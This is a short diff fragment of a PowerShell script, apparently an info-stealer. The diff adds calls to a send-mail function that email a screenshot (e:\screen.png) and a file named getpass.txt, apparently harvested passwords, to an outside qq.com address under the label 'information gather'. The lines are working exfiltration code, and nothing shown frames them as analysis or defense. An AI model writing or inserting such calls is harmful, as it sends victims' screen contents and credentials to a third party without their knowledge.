@@ -45,5 +45,6 @@ function send-mail{
 		write-host $_.exception.tostring()
 	}
 }
-send-mail -toaddress 3170096510@qq.com -subject "infor" -body "information gather" -file "e:\screen.png"
+send-mail -toaddress 3170096510@qq.com -subject "picture" -body "information gather" -file "e:\screen.png"
+send-mail -toaddress 3170096510@qq.com -subject "txt" -body "information gather" -file "e:\getpass.txt"
 
